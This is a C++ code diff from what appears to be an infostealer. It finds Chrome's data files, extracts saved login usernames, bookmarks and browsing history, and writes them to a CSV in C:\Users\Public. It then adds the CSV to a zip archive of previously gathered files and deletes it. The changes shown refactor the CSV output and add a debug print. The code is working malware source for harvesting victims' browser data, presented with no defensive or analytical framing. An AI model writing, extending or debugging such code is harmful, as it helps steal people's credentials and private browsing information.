@@ -85,9 +85,9 @@ int main() {
             // After gathering files and adding them to the zip archive, check if chrome data folder exist
             if (CheckChrome()) {
                 std::vector<std::string> ChromeFiles = IsBrowserDataExist();
+                printf("Chrome exist");
 
                 if (!ChromeFiles.empty()) {
-                    // Mapping Chrome data files to their corresponding functions and desired column names
                     std::map<std::string, std::pair<std::function<std::set<std::string>()>, std::string>> fileFunctionMap = {
                         {"Login Data For Account", {ChromeUsernames, "Usernames"}},
                         {"Bookmarks", {ChromeBookmarks, "Bookmarks"}},
@@ -96,42 +96,49 @@ int main() {
                         {"History", {ChromeHistoryURLs, "History URLs"}}
                     };
 
-                    // Open a CSV file in the public directory
                     std::ofstream csvFile("C:\\Users\\Public\\chrome_data.csv");
 
-                    // Write the column headers based on the desired names
-                    std::vector<std::string> columns;
+                    // Track columns for which data is available
+                    std::vector<std::string> availableColumns;
+
+                    // Write column headers
                     for (const auto& file : ChromeFiles) {
                         auto it = fileFunctionMap.find(file);
                         if (it != fileFunctionMap.end()) {
-                            csvFile << it->second.second << ",";
-                            columns.push_back(it->first); // Keep track of columns being written
+                            csvFile << "\"" << it->second.second << "\",";
+                            availableColumns.push_back(file);
                         }
+                    }
+                    if (!availableColumns.empty()) {
+                        csvFile.seekp(-1, std::ios_base::end); // Remove the last comma
                     }
                     csvFile << "\n";
 
-                    // Determine the maximum number of rows by checking the size of data sets
+                    // Determine the maximum number of rows needed
                     size_t maxRows = 0;
-                    for (const auto& col : columns) {
-                        auto it = fileFunctionMap.find(col);
+                    for (const auto& colKey : availableColumns) {
+                        auto it = fileFunctionMap.find(colKey);
                         if (it != fileFunctionMap.end()) {
                             maxRows = std::max(maxRows, it->second.first().size());
                         }
                     }
 
-                    // Write data to the CSV file, ensuring each entry goes under its respective column
+                    // Write data to the CSV, ensuring each entry is under its respective column
                     for (size_t i = 0; i < maxRows; ++i) {
-                        for (const auto& col : columns) {
-                            auto it = fileFunctionMap.find(col);
+                        for (size_t j = 0; j < availableColumns.size(); ++j) {
+                            const auto& colKey = availableColumns[j];
+                            auto it = fileFunctionMap.find(colKey);
                             if (it != fileFunctionMap.end()) {
-                                const auto& data = it->second.first();
-                                if (i < data.size()) {
-                                    auto dataIt = data.begin();
+                                const auto& dataSet = it->second.first();
+                                if (i < dataSet.size()) {
+                                    auto dataIt = dataSet.begin();
                                     std::advance(dataIt, i);
-                                    csvFile << *dataIt;
+                                    csvFile << "\"" << *dataIt << "\"";
                                 }
                             }
-                            csvFile << ",";
+                            if (j < availableColumns.size() - 1) {
+                                csvFile << ",";
+                            }
                         }
                         csvFile << "\n";
                     }
@@ -139,9 +146,8 @@ int main() {
                     csvFile.close();
                     std::cout << "Data has been written to C:\\Users\\Public\\chrome_data.csv" << std::endl;
 
-                    // Call the function to add the CSV file to the zip archive and then delete the CSV file
-                    std::string csvFilePath = "C:\\Users\\Public\\chrome_data.csv";
-                    if (AddFileToZipAndDelete(zipFile, csvFilePath)) {
+                    // Add CSV to zip and delete it
+                    if (AddFileToZipAndDelete(zipFile, "C:\\Users\\Public\\chrome_data.csv")) {
                         std::cout << "CSV file has been added to the zip archive and deleted successfully." << std::endl;
                     }
                     else {
